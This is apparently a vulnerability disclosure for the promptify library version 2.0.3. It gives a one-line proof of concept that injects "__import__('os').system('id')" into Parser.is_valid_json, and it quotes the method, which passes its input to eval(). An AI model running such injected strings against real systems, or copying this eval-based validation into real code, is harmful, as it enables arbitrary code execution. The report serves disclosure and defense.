version 2.0.3

poc:

```python
from promptify import Parser
parser = Parser()
parser.is_valid_json("__import__('os').system('id')")
```


analysis

```python
#parser/parser.py:36
    def is_valid_json(self, input_str: str) -> bool:
        """
        Check if the input string is valid JSON.

        Parameters
        ----------
        input_str : str
            The string to check for validity.

        Returns
        -------
        bool
            Returns True if the input string is valid JSON, otherwise False.

        Notes
        -----
        This function uses the `json` module to check if the input string is valid JSON.
        It evaluates the input string using `eval()`, and if it successfully loads
        a JSON object (either a dictionary or a list), it returns True. Otherwise, it
        returns False.

        Examples
        --------
        >>> validator = Parser()
        >>> validator.is_valid_json('{"name": "Alice", "age": 30}')
        True
        >>> validator.is_valid_json('[1, 2, 3, 4]')
        True
        >>> validator.is_valid_json('{"name": "Bob", "age": }')
        False
        >>> validator.is_valid_json('not a JSON string')
        False
        """
        try:
            output = eval(input_str)  #<-----------Eval Here
            if isinstance(output, (dict, list)):
                return True
            else:
                return False
        except Exception:
            return False

```
